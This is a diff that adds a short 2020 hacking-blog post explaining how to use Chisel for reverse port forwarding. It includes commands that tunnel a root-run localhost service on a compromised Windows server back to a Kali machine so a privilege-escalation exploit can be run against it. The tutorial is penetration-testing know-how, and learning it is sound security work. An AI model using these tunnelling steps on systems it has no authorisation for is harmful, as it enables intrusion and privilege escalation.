@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="author" content="Daniel Cano">
+<meta name="description" content="Port forwarding with Chisel and practical example">
+<meta name="keywords" content="hacking, technology, programming">
+<meta name="referrer" content="always">
+<meta property="og:description" content="Port forwarding with Chisel and practical example">
+<meta property="og:title" content="Port forwarding with Chisel over HTTP">
+<meta property="og:url" content="https://u915.net/posts/2020/09/port-forwarding-with-chisel-over-http/">
+<meta property="og:image" content="https://u915.net/images/logo_small.png" />
+<title>Port forwarding with Chisel over HTTP - u915</title>
+<link rel="stylesheet" type="text/css" href="/css/main.css">
+<link rel="icon" href="/images/favicon.png" type="image/x-icon">
+<link rel="shortcut icon" href="/images/favicon.png">
+</head>
+<body>
+<header>
+  <div class="blog-header">
+    <h1><a href="https://u915.net/">u915</a></h1>
+    <div><a href="https://u915.net/"><img src="/images/logo_small.png" class="bloglogo"></img></a></div><h4>Daniel Cano Merchán - Hacking &amp; Tech</h4>
+  </div>
+  <nav><a href="/">Index</a><a href="/posts/">Posts</a><a href="/tags/">Tags</a><a href="/hacking-tools/">Tools</a><a href="/about/">About</a></nav>
+</header>
+<main>
+  <article>
+    <div class="title">
+  <h1>Port forwarding with Chisel over HTTP</h1>
+  </div>
+<div class="meta">
+  <div class="meta-bar">2020-09-23
+  <span><a href="https://u915.net/tags/hacking/">#Hacking</a></span>
+      </div>
+  </div>
+<div class="content">
+  <p>This time i want to talk about Chisel an amazing tool written in Go, simple to use and multi OS which enable port forwarding over HTTP. This post are just minimal notes of how to use Chisel with a practical example.</p>
+<h3 id="getting-chisel-and-more-info">Getting Chisel and more info</h3>
+<p>Source code and full documentation about Chisel can be found on <a href="https://github.com/jpillora/chisel">Github</a>.</p>
+<p>There are precompiled binaries under the path releases: <a href="https://github.com/jpillora/chisel/releases">Chisel releases</a>.</p>
+<h3 id="port-forwarding">Port forwarding</h3>
+<p>Two modes needed, client and server, example with two machines.</p>
+<p><em>machine 1</em>: Deploying the server</p>
+<pre><code>chisel server -p PORT --reverse
+</code></pre>
+<p><em>machine 2</em>: Connecting to the Chisel server</p>
+<pre><code>chisel client IP_SERVER_CHISEL:PORT_SERVER_CHISEL R:PORT1:IP:PORT2
+</code></pre>
+<h3 id="practical-example">Practical example</h3>
+<p>There is a remote server cracked with a low privileged account, and we want to use a certain exploit with our machine for practical reasons, like there is not Python inside the server and there is a hard way to make the exploit work precompiling the source.</p>
+<p>Another example can be redirect the cracked server local port to be viewed on our local machine, there are infinity reasons.</p>
+<p>In the example, inside the cracked machine this time there is a service running with root privileges on the port 8080, deployed only on the localhost network 127.0.0.1 and we know a exploit to escalate priveleges.</p>
+<p>Deploying the Chisel server on the pentest machine using the precompiled version for Linux:</p>
+<pre><code>./chisel server -p 9003 --reverse
+2020/09/23 09:16:55 server: Reverse tunnelling enabled
+2020/09/23 09:16:55 server: Fingerprint XXXXXXXXXXXXX
+2020/09/23 09:16:55 server: Listening on 0.0.0.0:9003...
+</code></pre>
+<p>So this time a VM with Kali is listening on the port 9003 and awaiting remote connections to the port 9003.</p>
+<p><em>&ndash;reverse</em>, Allow clients to specify reverse port forwarding remotes in addition to normal remotes.</p>
+<p>On the remote server, Windows, starting a precompiled Chisel and reverse connecting the (remote)localhost port 8080 with the port 8080 on the Kali machine:</p>
+<pre><code>.\chisel.exe client 1.2.3.4:9003 R:8080:127.0.0.1:8080
+2020/09/23 09:17:08 client: Connecting to ws://1.2.3.4:9003
+2020/09/23 09:17:08 client: Fingerprint XXXXXXXXXXXXX
+2020/09/23 09:17:09 client: Connected (Latency 47.968ms)
+</code></pre>
+<p>Now the (remote)localhost port 8080 can be accesed on Kali and is reverse connected with the port 8080 on the Windows machine.</p>
+<p>The port 8080 can be used directly against the local network on Kali and will impact to the Windows remote server, so it is possible to use the exploit in a way like that:</p>
+<pre><code>python exploit.py 127.0.0.1 8080
+</code></pre>
+<p>Happy hacking!</p>
+</div>
+
+  </article>
+</main>
+<footer>
+  <div>
+    <nav class="footer-menu"><a href="https://github.com/u915">GitHub</a><a href="https://www.linkedin.com/in/daniel-canomerchan">Linkedin</a><a href="/posts/index.xml">RSS</a><a href="/sitemap.xml">Sitemap</a></nav>
+    <div>© 2020 — u915 — <a href="/license/">License</a></div>
+  </div>
+</footer>
+</body>
+</html>
